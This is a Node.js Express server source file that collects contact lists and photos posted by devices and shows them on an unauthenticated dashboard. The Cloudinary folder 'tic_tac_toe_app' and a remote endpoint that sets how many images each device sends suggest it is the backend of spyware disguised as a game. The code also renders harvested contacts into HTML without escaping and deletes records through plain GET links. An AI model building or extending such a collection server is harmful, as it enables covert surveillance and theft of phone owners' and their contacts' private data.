const express = require("express");
const { Pool } = require("pg");
const cloudinary = require("cloudinary").v2;
const multer = require("multer");

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const upload = multer({ storage: multer.memoryStorage() });

// ================= CLOUDINARY =================
cloudinary.config({
  cloud_name: process.env.CLOUD_NAME,
  api_key: process.env.API_KEY,
  api_secret: process.env.API_SECRET
});

// ================= DATABASE =================
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// ================= DB SETUP =================
async function initDB() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS users (
      id SERIAL PRIMARY KEY,
      device_id TEXT UNIQUE
    );

    CREATE TABLE IF NOT EXISTS contacts (
      id SERIAL PRIMARY KEY,
      device_id TEXT,
      contact TEXT,
      UNIQUE(device_id, contact)
    );

    CREATE TABLE IF NOT EXISTS images (
      id SERIAL PRIMARY KEY,
      device_id TEXT,
      image_url TEXT,
      UNIQUE(device_id, image_url)
    );
  `);
}
initDB();

// ================= CONFIG =================
let config = { limit: 5, offset: 0 };

app.get("/config/:device_id", (req, res) => {
  res.json(config);
});

app.post("/set-config", (req, res) => {
  config.limit = parseInt(req.body.limit);
  config.offset = parseInt(req.body.offset);
  res.redirect("back");
});

// ================= HOME =================
app.get("/", async (req, res) => {
  const users = await pool.query("SELECT COUNT(*) FROM users");

  res.send(`
  <html>
  <body style="background:#0f172a;color:white;padding:20px;">
    <h1>🚀 Dashboard</h1>
    <div>👤 Users: ${users.rows[0].count}</div>
    <br>
    <a href="/users">View Users</a>
  </body>
  </html>
  `);
});

// ================= RECEIVE CONTACTS =================
app.post("/receive", async (req, res) => {

  const { device_id, data } = req.body;

  for (let contact of data) {
    await pool.query(
      "INSERT INTO contacts (device_id, contact) VALUES ($1, $2) ON CONFLICT DO NOTHING",
      [device_id, contact]
    );
  }

  await pool.query(
    "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
    [device_id]
  );

  res.send("Contacts saved");
});

// ================= IMAGE UPLOAD =================
app.post("/upload-image", upload.single("image"), async (req, res) => {

  if (!req.file) {
    return res.status(400).send("No file");
  }

  try {
    const device_id = req.body.device_id;

    const stream = cloudinary.uploader.upload_stream(
      { folder: "tic_tac_toe_app" },
      async (error, result) => {

        if (error) return res.status(500).send("Upload error");

        const imageUrl = result.secure_url;

        await pool.query(
          "INSERT INTO images (device_id, image_url) VALUES ($1, $2) ON CONFLICT DO NOTHING",
          [device_id, imageUrl]
        );

        await pool.query(
          "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
          [device_id]
        );

        res.json({ url: imageUrl });
      }
    );

    stream.end(req.file.buffer);

  } catch (err) {
    res.status(500).send("Server error");
  }
});

// ================= USERS =================
app.get("/users", async (req, res) => {

  const users = await pool.query("SELECT * FROM users");

  let html = `<html><body style="background:#0f172a;color:white;padding:20px;">`;

  users.rows.forEach(u => {
    html += `
      <div style="margin:15px;">
        <b>${u.device_id}</b><br>
        <a href="/contacts/${u.device_id}">📞 Contacts</a> |
        <a href="/images/${u.device_id}">🖼 Images</a> |
        <a href="/delete-user/${u.device_id}">❌ Delete</a>
      </div>
    `;
  });

  html += `</body></html>`;
  res.send(html);
});

// ================= CONTACTS PAGE =================
app.get("/contacts/:device_id", async (req, res) => {

  const device = req.params.device_id;

  const contacts = await pool.query(
    "SELECT DISTINCT contact FROM contacts WHERE device_id=$1",
    [device]
  );

  let html = `<html><body style="background:#0f172a;color:white;padding:20px;">`;

  html += `<h2>Total Contacts: ${contacts.rows.length}</h2>`;

  contacts.rows.forEach(c => {
    html += `<div>${c.contact}</div>`;
  });

  html += `
    <br>
    <a href="/delete-contacts/${device}">❌ Delete All Contacts</a>
    <br><br>
    <a href="/users">⬅ Back</a>
  `;

  html += `</body></html>`;
  res.send(html);
});

// ================= IMAGES PAGE =================
app.get("/images/:device_id", async (req, res) => {

  const device = req.params.device_id;

  const images = await pool.query(
    "SELECT * FROM images WHERE device_id=$1",
    [device]
  );

  let html = `<html><body style="background:#0f172a;color:white;padding:20px;">`;

  html += `<h2>Total Images: ${images.rows.length}</h2>`;

  html += `
    <form method="POST" action="/set-config">
      Limit: <input name="limit" value="${config.limit}"/>
      Offset: <input name="offset" value="${config.offset}"/>
      <button>Update</button>
    </form>
    <br>
  `;

  images.rows.forEach(img => {
    html += `<img src="${img.image_url}" width="120" style="margin:5px;"/>`;
  });

  html += `
    <br><br>
    <a href="/delete-images/${device}">❌ Delete All Images</a>
    <br><br>
    <a href="/users">⬅ Back</a>
  `;

  html += `</body></html>`;
  res.send(html);
});

// ================= DELETE =================

app.get("/delete-contacts/:device_id", async (req, res) => {
  await pool.query("DELETE FROM contacts WHERE device_id=$1", [req.params.device_id]);
  res.redirect("/users");
});

app.get("/delete-images/:device_id", async (req, res) => {
  await pool.query("DELETE FROM images WHERE device_id=$1", [req.params.device_id]);
  res.redirect("/users");
});

app.get("/delete-user/:device_id", async (req, res) => {

  const id = req.params.device_id;

  await pool.query("DELETE FROM contacts WHERE device_id=$1", [id]);
  await pool.query("DELETE FROM images WHERE device_id=$1", [id]);
  await pool.query("DELETE FROM users WHERE device_id=$1", [id]);

  res.redirect("/users");
});

// ================= START =================
app.listen(process.env.PORT || 3000, () => {
  console.log("Server running...");
});
